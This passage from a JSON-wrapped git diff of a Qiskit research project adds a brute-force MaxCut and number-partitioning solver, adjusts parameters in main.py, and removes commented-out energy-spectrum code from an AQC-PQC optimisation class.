-5.474606432222031, -5.538409853965691, -5.611749378717045, -5.693000478625443, -5.7808807382792455, -5.874366420370951, -5.972630885535981, -6.074999988470246, -6.180918998637066, -6.289927529343797, -6.4016404219777945, -6.515733524828797, -6.631939774461214, -6.750003297851241, -6.750003297851241]\n-#energies_aqcpcq_1_layer = [-6, -5.950154451422959, -5.900752501028443, -5.851599417473611, -5.802810275859583, -5.756143421395298, -5.709640388324241, -5.663747298479056, -5.6187162302062434, -5.574728252892157, -5.532062018486879, -5.490699606453825, -5.4512718237156585, -5.416590678447584, -5.406928300964287, -5.4322567770114425, -5.483743933815743, -5.549963067454288, -5.637808125319982, -5.956258904387567, -6.333491366547241, -6.557759368393276, -6.794265208191857, -7.042191120246468, -7.3000746636667655, -7.56669758357127, -7.841036517600447, -8.12222509218769, -8.40952415147253, -8.702298821715617, -8.999999951495681, -8.999999951495681]\n-#energies_aqcpqc_2_layer = [-6, -5.950157261263083, -5.9014846312192635, -5.853497145472425, -5.80647272674259, -5.760501715222631, -5.715656725992175, -5.672441082806816, -5.630451764696526, -5.5945951732748735, -5.5570613522160475, -5.523330193226521, -5.489608225137747, -5.458743939422438, -5.457445871024463, -5.501311014037389, -5.571978192624387, -5.754371140922796, -5.933836080865668, -6.125010180756819, -6.333488907412294, -6.557177612912261, -6.7939464214127, -7.042026695042157, -7.299997078302127, -7.566666313970032, -7.84102539186039, -8.122222076713062, -8.409523724866252, -8.7022987886861, -8.99999998178523, -8.99999998178523]\n-#energies_aqcpqc_3_layer = []\n-'''\n\\ No newline at end of file\ndiff --git a\/brute_force.py b\/brute_force.py\nnew file mode 100644\nindex 0000000..4e36fec\n--- \/dev\/null\n+++ b\/brute_force.py\n@@ -0,0 +1,71 @@\n+import numpy as np\n+import collections\n+\n+\n+class Brute_Force():\n+    def __init__(self, problem):\n+\n+        self.problem_type = problem['type']\n+        self.problem_properties = problem['properties']\n+\n+        optimal_cost, optimal_strings = self.get_optimal_cost_and_strings()\n+        print(f'For the given {self.problem_type} problem the optimal cost function value is {optimal_cost} and the optimal bitstrings are {optimal_strings}')\n+\n+\n+    def get_optimal_cost_and_strings(self):\n+\n+        #Note that in MaxCut we are searching for the maximum cost function value while in Number Paritioning for the minimum.\n+\n+\n+        if self.problem_type == 'MaxCut': #The following code was taken from qiskit textbook!\n+\n+            adjacency_matrix = self.problem_properties\n+            optimal_cost = 0\n+            number_of_qubits = len(adjacency_matrix)\n+            cost_function_values = collections.defaultdict(list)\n+            for b in range(2**number_of_qubits):\n+                x = [int(t) for t in reversed(list(bin(b)[2:].zfill(number_of_qubits)))]\n+                cost = 0\n+                for i in range(number_of_qubits):\n+                    for j in range(number_of_qubits):\n+                        cost += adjacency_matrix[i,j] * x[i] * (1-x[j])\n+\n+                cost = np.round(cost, 7)\n+                x.reverse()\n+                cost_function_values[cost].append(x)\n+\n+                if optimal_cost < cost:\n+                    optimal_cost = cost\n+\n+            cost_function_values = sorted(cost_function_values.items())\n+            optimal_strings = cost_function_values[-1][1]\n+\n+\n+        elif self.problem_type == 'NumberPartitioning':\n+\n+            numbers_list = self.problem_properties\n+            best_cost = np.inf\n+            number_of_qubits = len(numbers_list)\n+            cost_function_values = collections.defaultdict(list)\n+\n+            for b in range(2**number_of_qubits):\n+                x = [int(t) for t in reversed(list(bin(b)[2:].zfill(number_of_qubits)))]\n+                cost = 0\n+                for i in range(number_of_qubits):\n+                    cost += (2*x[i]-1)*numbers_list[i]\n+\n+\n+                cost = cost**2\n+                cost = np.round(cost, 7)\n+\n+                x.reverse()\n+                cost_function_values[cost].append(x)\n+\n+                if best_cost > cost:\n+                    best_cost = cost\n+\n+            cost_function_values = sorted(cost_function_values.items())\n+            optimal_strings = cost_function_values[0][1]\n+\n+        return optimal_cost, optimal_strings\n+            \n\\ No newline at end of file\ndiff --git a\/hamiltonian.py b\/hamiltonian.py\nindex dd520a0..4881e04 100644\n--- a\/hamiltonian.py\n+++ b\/hamiltonian.py\n@@ -1,7 +1,6 @@\n import numpy as np\n \n \n-\n class Hamiltonian():\n \n     def __init__(self, number_of_qubits, problem):\ndiff --git a\/main.py b\/main.py\nindex a5fec4f..d886e91 100644\n--- a\/main.py\n+++ b\/main.py\n@@ -2,10 +2,11 @@\n from hamiltonian import Hamiltonian \n from quantum_circuit import QCir\n import networkx as nx\n+from brute_force import Brute_Force\n \n \n-seed = 1\n-number_of_qubits = 4\n+seed = 2\n+number_of_qubits = 6\n steps = 30 #Choose number of steps to interpolate from initial to final Hamiltonian\n connectivity = 'nearest-neighbors' #This is the connectivity of the non-parameterized gates in the Hardware Efficient ansatz\n single_qubit_gates = 'ry'\n@@ -13,11 +14,13 @@\n layers = 1\n entanglement = 'linear'\n \n-graph = nx.random_regular_graph(3, number_of_qubits, seed=1)\n+graph = nx.random_regular_graph(3, number_of_qubits, seed=seed)\n w = nx.to_numpy_matrix(graph, nodelist=sorted(graph.nodes()))\n \n problem = {'type':'MaxCut', 'properties': w}\n \n+Brute_Force(problem)\n+\n \n aqc_pqc = AQC_PQC(number_of_qubits, problem, steps, layers, single_qubit_gates, entanglement_gates, entanglement)\n aqc_pqc.run()\n\\ No newline at end of file\n","files":{"\/aqc_pqc.py":{"changes":[{"diff":"\n \n         return energies_aqcpqc\n \n-\n-\n-'''\n-def best_cost_brute(adjacency_matrix): #This function calculates the optimal cost function by brute force\n-    best_cost = 0\n-    number_of_qubits = len(adjacency_matrix)\n-    best_string = 0\n-    costs = collections.defaultdict(list)\n-    for b in range(2**number_of_qubits):\n-        x = [int(t) for t in reversed(list(bin(b)[2:].zfill(number_of_qubits)))]\n-        cost = 0\n-        for i in range(number_of_qubits):\n-            for j in range(number_of_qubits):\n-                cost += adjacency_matrix[i,j] * x[i] * (1-x[j])\n-\n-        cost = np.round(cost,5)\n-        x.reverse()\n-        costs[cost].append(x)\n-\n-        if best_cost < cost:\n-            best_cost = cost\n-            best_string = x\n-\n-    costs = sorted(costs.items())\n-    return best_cost, best_string, costs\n-\n-\n-best_cost, best_string, costs = best_cost_brute(w)\n-print(costs)\n-print(f'For the given instance the optimal cost is {best_cost} and the bitstrings corresponding to that are {costs[-1][1]}')\n-\n-\n-\n-\n-\n-\n-def get_offset(number_of_qubits, adjacency_matrix): #The offset (constant part of the Hamiltonian) for a general graph.\n-    offset = 0\n-    for i in range(number_of_qubits):\n-        for j in range(number_of_qubits):\n-            if i<j:\n-                offset += adjacency_matrix[i,j]\/2\n-    return offset\n-\n-\n-def minimum_instantaneous(time): #This gives the minimum energy at a given time.\n-    hamil = calculate_instantaneous_hamiltonian(time)\n-    eigenvalues, v1 = np.linalg.eig(hamil)\n-    min_eig = np.min(eigenvalues) - time*offset\n-    return np.real(min_eig)\n-\n-\n-def calculate_spectrum(steps, plot=True):\n-    gs_energies = []\n-    first_excited_energies = []\n-    ener1, ener2, ener3, ener4, ener5, ener6, ener7, ener8, ener9, ener10 = [],[],[],[],[],[],[],[],[],[]\n-    for step in range(steps+1):\n-        hamiltonian = calculate_instantaneous_hamiltonian(step\/steps)\n-        q, v = np.linalg.eigh(hamiltonian)\n-        q = sorted(q)\n-        gs_energy = q[0]\n-        en1, en2, en3, en4, en5, en6, en7, en8, en9, en10 = q[1], q[2], q[3], q[4], q[5], q[6], q[7], q[8], q[9], q[10]\n-        for k in range(len(q)):\n-            if np.round(q[k], 5) != np.round(gs_energy, 5):\n-                break\n-        first_excited_energy = q[k+1]\n-\n-        ener1.append(en1-(step\/steps)*offset)\n-        ener2.append(en2-(step\/steps)*offset)\n-        ener3.append(en3-(step\/steps)*offset)\n-        ener4.append(en4-(step\/steps)*offset)\n-        ener5.append(en5-(step\/steps)*offset)\n-        ener6.append(en6-(step\/steps)*offset)\n-        ener7.append(en7-(step\/steps)*offset)\n-        ener8.append(en8-(step\/steps)*offset)\n-        ener9.append(en9-(step\/steps)*offset)\n-        ener10.append(en10-(step\/steps)*offset)\n-        gs_energies.append(gs_energy-(step\/steps)*offset)\n-        first_excited_energies.append(first_excited_energy-(step\/steps)*offset)\n-    \n-    time = [step\/steps for step in range(steps+1)]\n-    if plot == True:\n-        plt.plot(time, gs_energies, label='Ground State energy')\n-        #plt.plot(time, first_excited_energies, label='First Excited energy')\n-        plt.plot(time, ener1, label='energy1')\n-        plt.plot(time, ener2, label='energy2')\n-        plt.plot(time, ener3, label='energy3')\n-        plt.plot(time, ener4, label='energy4')\n-        plt.plot(time, ener5, label='energy5')\n-        plt.plot(time, ener6, label='energy6')\n-        plt.plot(time, ener7, label='energy7')\n-        plt.plot(time, ener8, label='energy8')\n-        plt.plot(time, ener9, label='energy9')\n-        plt.plot(time, ener10, label='energy10')\n-        plt.legend(fontsize=14)\n-        plt.show()\n-\n-    return gs_energies, first_excited_energies, ener1, ener2, ener3, ener4, ener5, ener6, ener7, ener8, ener9, ener10\n-\n-gs_energies, first_excited_energies, ener1, ener2, ener3, ener4, ener5, ener6, ener7, ener8, ener9, ener10 = calculate_spectrum(steps)\n-\n-print(gs_energies)\n-print(first_excited_energies)\n-\n-#We must first calculate the linear system of equations.\n-\n-\n-\n-\n-#energies_aqqpqc_0_layer = [-6, -5.950000000000003, -5.900000000000002, -5.850000000000002, -5.8000000000000025, -5.7500000000000036, -5.700000000000003, -5.650000000000001, -5.600000000000002, -5.550000000000001, -5.500000000000002, -5.450000000000001, -5.400000000000001, -5.3675997603859695, -5.364692179604818, -5.384587040477438, -5.422425754662893, -5.474606432222031, -5.538409853965691, -5.611749378717045, -5.693000478625443, -5.7808807382792455, -5.874366420370951, -5.972630885535981, -6.074999988470246, -6.180918998637066, -6.289927529343797, -6.4016404219777945, -6.515733524828797, -6.631939774461214, -6.750003297851241, -6.750003297851241]\n-#energies_aqcpcq_1_layer = [-6, -5.950154451422959, -5.900752501028443, -5.851599417473611, -5.802810275859583, -5.756143421395298, -5.709640388324241, -5.663747298479056, -5.6187162302062434, -5.574728252892157, -5.532062018486879, -5.490699606453825, -5.4512718237156585, -5.416590678447584, -5.406928300964287, -5.4322567770114425, -5.483743933815743, -5.549963067454288, -5.637808125319982, -5.956258904387567, -6.333491366547241, -6.557759368393276, -6.794265208191857, -7.042191120246468, -7.3000746636667655, -7.56669758357127, -7.841036517600447, -8.12222509218769, -8.40952415147253, -8.702298821715617, -8.999999951495681, -8.999999951495681]\n-#energies_aqcpqc_2_layer = [-6, -5.950157261263083, -5.9014846312192635, -5.853497145472425, -5.80647272674259, -5.760501715222631, -5.715656725992175, -5.672441082806816, -5.630451764696526, -5.5945951732748735, -5.5570613522160475, -5.523330193226521, -5.489608225137747, -5.458743939422438, -5.457445871024463, -5.501311014037389, -5.571978192624387, -5.754371140922796, -5.933836080865668, -6.125010180756819, -6.333488907412294, -6.557177612912261, -6.7939464214127, -7.042026695042157, -7.299997078302127, -7.566666313970032, -7.84102539186039, -8.122222076713062, -8.409523724866252, -8.7022987886861, -8.99999998178523, -8.99999998178523]\n-#energies_aqcpqc_3_layer = []\n-'''\n\\ No newline at end of f","add":0,"remove":114,"filename":"\/aqc_pqc.py","badparts":["'''","def best_cost_brute(adjacency_matrix): #This function calculates the optimal cost function by brute force","    best_cost = 0","    number_of_qubits = len(adjacency_matrix)","    best_string = 0","    costs = collections.defaultdict(list)","    for b in range(2**number_of_qubits):","        x = [int(t) for t in reversed(list(bin(b)[2:].zfill(number_of_qubits)))]","        cost = 0","        for i in range(number_of_qubits):","            for j in range(number_of_qubits):","                cost += adjacency_matrix[i,j] * x[i] * (1-x[j])","        cost = np.round(cost,5)","        x.reverse()","        costs[cost].append(x)","        if best_cost < cost:","            best_cost = cost","            best_string = x","    costs = sorted(costs.items())","    return best_cost, best_string, costs","best_cost, best_string, costs = best_cost_brute(w)","print(costs)","print(f'For the given instance the optimal cost is {best_cost} and the bitstrings corresponding to that are {costs[-1][1]}')","def get_offset(number_of_qubits, adjacency_matrix): #The offset (constant part of the Hamiltonian) for a general graph.","    offset = 0","    for i in range(number_of_qubits):","        for j in range(number_of_qubits):","            if i<j:","                offset += adjacency_matrix[i,j]\/2","    return offset","def minimum_instantaneous(time): #This gives the minimum energy at a given time.","    hamil = calculate_instantaneous_hamiltonian(time)","    eigenvalues, v1 = np.linalg.eig(hamil)","    min_eig = np.min(eigenvalues) - time*offset","    return np.real(min_eig)","def calculate_spectrum(steps, plot=True):","    gs_energies = []","    first_excited_energies = []","    ener1, ener2, ener3, ener4, ener5, ener6, ener7, ener8, ener9, ener10 = [],[],[],[],[],[],[],[],[],[]","    for step in range(steps+1):","        hamiltonian = calculate_instantaneous_hamiltonian(step\/steps)","        q, v = np.linalg.eigh(hamiltonian)","        q = sorted(q)","        gs_energy = q[0]","        en1, en2, en3, en4, en5, en6, en7, en8, en9, en10 = q[1], q[2], q[3], q[4], q[5], q[6], q[7], q[8], q[9], q[10]","        for k in range(len(q)):","            if np.round(q[k], 5) != np.round(gs_energy, 5):","                break","        first_excited_energy = q[k+1]","        ener1.append(en1-(step\/steps)*offset)","        ener2.append(en2-(step\/steps)*offset)","        ener3.append(en3-(step\/steps)*offset)","        ener4.append(en4-(step\/steps)*offset)","        ener5.append(en5-(step\/steps)*offset)","        ener6.append(en6-(step\/steps)*offset)","        ener7.append(en7-(step\/steps)*offset)","        ener8.append(en8-(step\/steps)*offset)","        ener9.append(en9-(step\/steps)*offset)","        ener10.append(en10-(step\/steps)*offset)","        gs_energies.append(gs_energy-(step\/steps)*offset)","        first_excited_energies.append(first_excited_energy-(step\/steps)*offset)","    time = [step\/steps for step in range(steps+1)]","    if plot == True:","        plt.plot(time, gs_energies, label='Ground State energy')","        plt.plot(time, ener1, label='energy1')","        plt.plot(time, ener2, label='energy2')","        plt.plot(time, ener3, label='energy3')","        plt.plot(time, ener4, label='energy4')","        plt.plot(time, ener5, label='energy5')","        plt.plot(time, ener6, label='energy6')","        plt.plot(time, ener7, label='energy7')","        plt.plot(time, ener8, label='energy8')","        plt.plot(time, ener9, label='energy9')","        plt.plot(time, ener10, label='energy10')","        plt.legend(fontsize=14)","        plt.show()","    return gs_energies, first_excited_energies, ener1, ener2, ener3, ener4, ener5, ener6, ener7, ener8, ener9, ener10","gs_energies, first_excited_energies, ener1, ener2, ener3, ener4, ener5, ener6, ener7, ener8, ener9, ener10 = calculate_spectrum(steps)","print(gs_energies)","print(first_excited_energies)","'''"],"goodparts":[]}],"source":"\nfrom qiskit.visualization import * import numpy as np import scipy.optimize as optimize import networkx as nx import collections from hamiltonian import Hamiltonian from quantum_circuit import QCir from qiskit.quantum_info import Statevector class AQC_PQC(): def __init__(self, number_of_qubits, problem, steps, layers, single_qubit_gates, entanglement_gates, entanglement, use_third_derivatives='No'): self.number_of_qubits=number_of_qubits self.problem=problem self.steps=steps self.layers=layers self.single_qubit_gates=single_qubit_gates self.entanglement_gates=entanglement_gates self.entanglement=entanglement qcir=QCir(self.number_of_qubits, 'initial', self.layers, self.single_qubit_gates, self.entanglement_gates, self.entanglement) self.initial_parameters=qcir.get_initial_parameters() self.number_of_parameters=len(self.initial_parameters) hamiltonians=Hamiltonian(self.number_of_qubits, self.problem) self.initial_hamiltonian=hamiltonians.construct_initial_hamiltonian() self.target_hamiltonian=hamiltonians.construct_problem_hamiltonian() def get_expectation_value(self, angles, observable): circuit=QCir(self.number_of_qubits, angles, self.layers, self.single_qubit_gates, self.entanglement_gates, self.entanglement) sv1=Statevector.from_label('0'*self.number_of_qubits) sv1=sv1.evolve(circuit.qcir) expectation_value=sv1.expectation_value(observable) return np.real(expectation_value) def get_hessian_matrix(self, observable, angles): hessian=np.zeros((self.number_of_parameters, self.number_of_parameters)) for parameter1 in range(self.number_of_parameters): for parameter2 in range(self.number_of_parameters): if parameter1 < parameter2: hessian_thetas_1, hessian_thetas_2, hessian_thetas_3, hessian_thetas_4=angles.copy(), angles.copy(), angles.copy(), angles.copy() hessian_thetas_1[parameter1] +=np.pi\/2 hessian_thetas_1[parameter2] +=np.pi\/2 hessian_thetas_2[parameter1] -=np.pi\/2 hessian_thetas_2[parameter2] +=np.pi\/2 hessian_thetas_3[parameter1] +=np.pi\/2 hessian_thetas_3[parameter2] -=np.pi\/2 hessian_thetas_4[parameter1] -=np.pi\/2 hessian_thetas_4[parameter2] -=np.pi\/2 hessian[parameter1, parameter2] +=self.get_expectation_value(hessian_thetas_1, observable)\/4 hessian[parameter1, parameter2] -=self.get_expectation_value(hessian_thetas_2, observable)\/4 hessian[parameter1, parameter2] -=self.get_expectation_value(hessian_thetas_3, observable)\/4 hessian[parameter1, parameter2] +=self.get_expectation_value(hessian_thetas_4, observable)\/4 hessian[parameter2, parameter1]=hessian[parameter1, parameter2] if parameter1==parameter2: hessian_thetas_1, hessian_thetas_2=angles.copy(), angles.copy() hessian_thetas_1[parameter1] +=np.pi hessian_thetas_2[parameter1] -=np.pi hessian[parameter1, parameter1] +=self.get_expectation_value(hessian_thetas_1, observable)\/4 hessian[parameter1, parameter1] +=self.get_expectation_value(hessian_thetas_2, observable)\/4 hessian[parameter1, parameter1] -=self.get_expectation_value(angles, observable)\/2 return hessian def get_instantaneous_hamiltonian(self, time): return(1-time)*self.initial_hamiltonian +time*self.target_hamiltonian def get_linear_system(self, hamiltonian, angles): zero_order_terms=np.zeros((self.number_of_parameters,)) first_order_terms=np.zeros((self.number_of_parameters, self.number_of_parameters)) for parameter in range(self.number_of_parameters): zero_order_thetas_1, zero_order_thetas_2=angles.copy(), angles.copy() zero_order_thetas_1[parameter] +=np.pi\/2 zero_order_thetas_2[parameter] -=np.pi\/2 zero_order_terms[parameter] +=1\/2*self.get_expectation_value(zero_order_thetas_1, hamiltonian) zero_order_terms[parameter] -=1\/2*self.get_expectation_value(zero_order_thetas_2, hamiltonian) for parameter1 in range(self.number_of_parameters): for parameter2 in range(self.number_of_parameters): if parameter1 <=parameter2: first_order_thetas_1, first_order_thetas_2, first_order_thetas_3, first_order_thetas_4=angles.copy(), angles.copy(), angles.copy(), angles.copy() first_order_thetas_1[parameter1] +=np.pi\/2 first_order_thetas_1[parameter2] +=np.pi\/2 first_order_thetas_2[parameter1] +=np.pi\/2 first_order_thetas_2[parameter2] -=np.pi\/2 first_order_thetas_3[parameter1] -=np.pi\/2 first_order_thetas_3[parameter2] +=np.pi\/2 first_order_thetas_4[parameter1] -=np.pi\/2 first_order_thetas_4[parameter2] -=np.pi\/2 first_order_terms[parameter1, parameter2] +=self.get_expectation_value(first_order_thetas_1, hamiltonian)\/4 first_order_terms[parameter1, parameter2] -=self.get_expectation_value(first_order_thetas_2, hamiltonian)\/4 first_order_terms[parameter1, parameter2] -=self.get_expectation_value(first_order_thetas_3, hamiltonian)\/4 first_order_terms[parameter1, parameter2] +=self.get_expectation_value(first_order_thetas_4, hamiltonian)\/4 first_order_terms[parameter2, parameter1]=first_order_terms[parameter1, parameter2] return np.array(zero_order_terms), np.array(first_order_terms) def minimum_eigenvalue(self, matrix): eigenvalues, eigenvectors=np.linalg.eig(matrix) min_eigen=np.min(eigenvalues) print(min_eigen) return min_eigen def run(self): energies_aqcpqc=[] lambdas=[i for i in np.linspace(0, 1, self.steps+1)][1:] optimal_thetas=self.initial_parameters.copy() print(f'We start with the optimal angles of the initial hamiltonian:{optimal_thetas}') initial_hessian=self.get_hessian_matrix(self.initial_hamiltonian, optimal_thetas) w, v=np.linalg.eig(initial_hessian) print(f'The eigenvalues of the initial Hessian are{np.round(w,5)}') for lamda in lambdas: print('\\n') print(f'We are working on{lamda}') hamiltonian=self.get_instantaneous_hamiltonian(lamda) zero, first=self.get_linear_system(hamiltonian, optimal_thetas) def equations(x): array=np.array([x[_] for _ in range(self.number_of_parameters)]) equations=zero +first@array y=np.array([equations[_] for _ in range(self.number_of_parameters)]) return y@y def minim_eig_constraint(x): new_thetas=[optimal_thetas[i] +x[i] for i in range(self.number_of_parameters)] return self.minimum_eigenvalue(self.get_hessian_matrix(hamiltonian, new_thetas)) cons=[{'type': 'ineq', 'fun':minim_eig_constraint}] res=optimize.minimize(equations, x0=[0 for _ in range(self.number_of_parameters)], constraints=cons, method='COBYLA', options={'disp': True, 'maxiter':700}) epsilons=[res.x[_] for _ in range(self.number_of_parameters)] print(f'The solutions of equations are{epsilons}') optimal_thetas=[optimal_thetas[_] +epsilons[_] for _ in range(self.number_of_parameters)] hessian=self.get_hessian_matrix(hamiltonian, optimal_thetas) min_eigen=self.minimum_eigenvalue(hessian) inst_exp_value=self.get_expectation_value(optimal_thetas, hamiltonian) energies_aqcpqc.append(inst_exp_value) print(f'and the minimum eigenvalue of the Hessian at the solution is{min_eigen}') print(f'and the instantaneous expectation values is{inst_exp_value}') return energies_aqcpqc ''' def best_cost_brute(adjacency_matrix): best_cost=0 number_of_qubits=len(adjacency_matrix) best_string=0 costs=collections.defaultdict(list) for b in range(2**number_of_qubits): x=[int(t) for t in reversed(list(bin(b)[2:].zfill(number_of_qubits)))] cost=0 for i in range(number_of_qubits): for j in range(number_of_qubits): cost +=adjacency_matrix[i,j] * x[i] *(1-x[j]) cost=np.round(cost,5) x.reverse() costs[cost].append(x) if best_cost < cost: best_cost=cost best_string=x costs=sorted(costs.items()) return best_cost, best_string, costs best_cost, best_string, costs=best_cost_brute(w) print(costs) print(f'For the given instance the optimal cost is{best_cost} and the bitstrings corresponding to that are{costs[-1][1]}') def get_offset(number_of_qubits, adjacency_matrix): offset=0 for i in range(number_of_qubits): for j in range(number_of_qubits): if i<j: offset +=adjacency_matrix[i,j]\/2 return offset def minimum_instantaneous(time): hamil=calculate_instantaneous_hamiltonian(time) eigenvalues, v1=np.linalg.eig(hamil) min_eig=np.min(eigenvalues) -time*offset return np.real(min_eig) def calculate_spectrum(steps, plot=True): gs_energies=[] first_excited_energies=[] ener1, ener2, ener3, ener4, ener5, ener6, ener7, ener8, ener9, ener10=[],[],[],[],[],[],[],[],[],[] for step in range(steps+1): hamiltonian=calculate_instantaneous_hamiltonian(step\/steps) q, v=np.linalg.eigh(hamiltonian) q=sorted(q) gs_energy=q[0] en1, en2, en3, en4, en5, en6, en7, en8, en9, en10=q[1], q[2], q[3], q[4], q[5], q[6], q[7], q[8], q[9], q[10] for k in range(len(q)): if np.round(q[k], 5) !=np.round(gs_energy, 5): break first_excited_energy=q[k+1] ener1.append(en1-(step\/steps)*offset) ener2.append(en2-(step\/steps)*offset) ener3.append(en3-(step\/steps)*offset) ener4.append(en4-(step\/steps)*offset) ener5.append(en5-(step\/steps)*offset) ener6.append(en6-(step\/steps)*offset) ener7.append(en7-(step\/steps)*offset) ener8.append(en8-(step\/steps)*offset) ener9.append(en9-(step\/steps)*offset) ener10.append(en10-(step\/steps)*offset) gs_energies.append(gs_energy-(step\/steps)*offset) first_excited_energies.append(first_excited_energy-(step\/steps)*offset) time=[step\/steps for step in range(steps+1)] if plot==True: plt.plot(time, gs_energies, label='Ground State energy') plt.plot(time, ener1, label='energy1') plt.plot(time, ener2, label='energy2') plt.plot(time, ener3, label='energy3') plt.plot(time, ener4, label='energy4') plt.plot(time, ener5, label='energy5') plt.plot(time, ener6, label='energy6') plt.plot(time, ener7, label='energy7') plt.plot(time, ener8, label='energy8') plt.plot(time, ener9, label='energy9') plt.plot(time, ener10, label='energy10') plt.legend(fontsize=14) plt.show() return gs_energies, first_excited_energies, ener1, ener2, ener3, ener4, ener5, ener6, ener7, ener8, ener9, ener10 gs_energies, first_excited_energies, ener1, ener2, ener3, ener4, ener5, ener6, ener7, ener8, ener9, ener10=calculate_spectrum(steps) print(gs_energies) print(first_excited_energies) ''' ","sourceWithComments":"from qiskit.visualization import *\nimport numpy as np\nimport scipy.optimize as optimize\nimport networkx as nx\nimport collections\nfrom hamiltonian import Hamiltonian\nfrom quantum_circuit import QCir\nfrom qiskit.quantum_info import Statevector\n\n#is constructing the circuit and assigning parameters harder than running the circuit all the time\n\nclass AQC_PQC():\n    def __init__(self, number_of_qubits, problem, steps, layers, single_qubit_gates, entanglement_gates, entanglement, use_third_derivatives = 'No'):\n\n        self.number_of_qubits = number_of_qubits\n        self.problem = problem\n        self.steps = steps\n        self.layers = layers\n        self.single_qubit_gates = single_qubit_gates\n        self.entanglement_gates = entanglement_gates\n        self.entanglement = entanglement\n\n        qcir = QCir(self.number_of_qubits, 'initial', self.layers, self.single_qubit_gates, self.entanglement_gates, self.entanglement)\n\n        self.initial_parameters = qcir.get_initial_parameters()\n        self.number_of_parameters = len(self.initial_parameters)\n\n        hamiltonians = Hamiltonian(self.number_of_qubits, self.problem)\n\n        self.initial_hamiltonian = hamiltonians.construct_initial_hamiltonian()\n        self.target_hamiltonian = hamiltonians.construct_problem_hamiltonian()\n\n\n    def get_expectation_value(self, angles, observable):\n        circuit = QCir(self.number_of_qubits, angles, self.layers, self.single_qubit_gates, self.entanglement_gates, self.entanglement)\n        sv1 = Statevector.from_label('0'*self.number_of_qubits)\n        sv1 = sv1.evolve(circuit.qcir)\n        expectation_value = sv1.expectation_value(observable)\n        return np.real(expectation_value)\n    \n    def get_hessian_matrix(self, observable, angles):\n\n        hessian = np.zeros((self.number_of_parameters, self.number_of_parameters))\n    \n        for parameter1 in range(self.number_of_parameters):\n            for parameter2 in range(self.number_of_parameters):\n                if parameter1 < parameter2:    \n                    \n                    hessian_thetas_1, hessian_thetas_2, hessian_thetas_3, hessian_thetas_4 = angles.copy(), angles.copy(), angles.copy(), angles.copy()\n\n                    hessian_thetas_1[parameter1] += np.pi\/2\n                    hessian_thetas_1[parameter2] += np.pi\/2\n\n\n                    hessian_thetas_2[parameter1] -= np.pi\/2\n                    hessian_thetas_2[parameter2] += np.pi\/2\n\n                    hessian_thetas_3[parameter1] += np.pi\/2\n                    hessian_thetas_3[parameter2] -= np.pi\/2\n\n                    hessian_thetas_4[parameter1] -= np.pi\/2\n                    hessian_thetas_4[parameter2] -= np.pi\/2\n\n                    hessian[parameter1, parameter2] += self.get_expectation_value(hessian_thetas_1, observable)\/4\n                    hessian[parameter1, parameter2] -= self.get_expectation_value(hessian_thetas_2, observable)\/4\n                    hessian[parameter1, parameter2] -= self.get_expectation_value(hessian_thetas_3, observable)\/4\n                    hessian[parameter1, parameter2] += self.get_expectation_value(hessian_thetas_4, observable)\/4\n\n                    hessian[parameter2, parameter1] = hessian[parameter1, parameter2]\n                    \n                if parameter1 == parameter2:\n\n                    hessian_thetas_1 , hessian_thetas_2 = angles.copy(), angles.copy()\n\n                    hessian_thetas_1[parameter1] += np.pi\n                    hessian_thetas_2[parameter1] -= np.pi\n                    \n                    hessian[parameter1, parameter1] += self.get_expectation_value(hessian_thetas_1, observable)\/4\n                    hessian[parameter1, parameter1] += self.get_expectation_value(hessian_thetas_2, observable)\/4\n                    hessian[parameter1, parameter1] -= self.get_expectation_value(angles, observable)\/2\n\n        return hessian\n    \n\n    def get_instantaneous_hamiltonian(self, time):\n        return (1-time)*self.initial_hamiltonian + time*self.target_hamiltonian\n    \n    def get_linear_system(self, hamiltonian, angles): #Construct function get_derivatives() and replace zero order terms. Also replace below with get_hessian\n\n        zero_order_terms = np.zeros((self.number_of_parameters,))\n        first_order_terms = np.zeros((self.number_of_parameters, self.number_of_parameters))\n\n        #We start with zero order terms.\n        for parameter in range(self.number_of_parameters):\n\n            zero_order_thetas_1, zero_order_thetas_2 = angles.copy(), angles.copy()\n            zero_order_thetas_1[parameter] += np.pi\/2\n            zero_order_thetas_2[parameter] -= np.pi\/2\n\n\n            zero_order_terms[parameter] += 1\/2*self.get_expectation_value(zero_order_thetas_1, hamiltonian)\n            zero_order_terms[parameter] -= 1\/2*self.get_expectation_value(zero_order_thetas_2, hamiltonian)\n\n        #Next we continue with first order terms.\n        for parameter1 in range(self.number_of_parameters):\n            for parameter2 in range(self.number_of_parameters):\n                if parameter1 <= parameter2:\n                \n                    first_order_thetas_1, first_order_thetas_2, first_order_thetas_3, first_order_thetas_4 = angles.copy(), angles.copy(), angles.copy(), angles.copy()\n\n                    first_order_thetas_1[parameter1] += np.pi\/2\n                    first_order_thetas_1[parameter2] += np.pi\/2\n\n                    first_order_thetas_2[parameter1] += np.pi\/2\n                    first_order_thetas_2[parameter2] -= np.pi\/2\n\n                    first_order_thetas_3[parameter1] -= np.pi\/2\n                    first_order_thetas_3[parameter2] += np.pi\/2\n\n                    first_order_thetas_4[parameter1] -= np.pi\/2\n                    first_order_thetas_4[parameter2] -= np.pi\/2\n\n                    first_order_terms[parameter1, parameter2] += self.get_expectation_value(first_order_thetas_1, hamiltonian)\/4\n                    first_order_terms[parameter1, parameter2] -= self.get_expectation_value(first_order_thetas_2, hamiltonian)\/4\n                    first_order_terms[parameter1, parameter2] -= self.get_expectation_value(first_order_thetas_3, hamiltonian)\/4\n                    first_order_terms[parameter1, parameter2] += self.get_expectation_value(first_order_thetas_4, hamiltonian)\/4\n\n                    first_order_terms[parameter2, parameter1] = first_order_terms[parameter1, parameter2]\n\n        return np.array(zero_order_terms), np.array(first_order_terms)\n    \n    def minimum_eigenvalue(self, matrix):\n\n        eigenvalues, eigenvectors = np.linalg.eig(matrix)\n        min_eigen = np.min(eigenvalues)\n        print(min_eigen)\n        return min_eigen\n\n    def run(self):\n        \n        energies_aqcpqc = []\n\n        lambdas = [i for i in np.linspace(0, 1, self.steps+1)][1:]\n        optimal_thetas = self.initial_parameters.copy()\n        print(f'We start with the optimal angles of the initial hamiltonian: {optimal_thetas}')\n\n        initial_hessian = self.get_hessian_matrix(self.initial_hamiltonian, optimal_thetas) \n        w, v = np.linalg.eig(initial_hessian)\n        print(f'The eigenvalues of the initial Hessian are {np.round(w,5)}')\n\n        for lamda in lambdas:\n            print('\\n')\n            print(f'We are working on {lamda}')\n            hamiltonian = self.get_instantaneous_hamiltonian(lamda)\n            zero, first = self.get_linear_system(hamiltonian, optimal_thetas)\n\n\n            def equations(x):\n                array = np.array([x[_] for _ in range(self.number_of_parameters)])\n                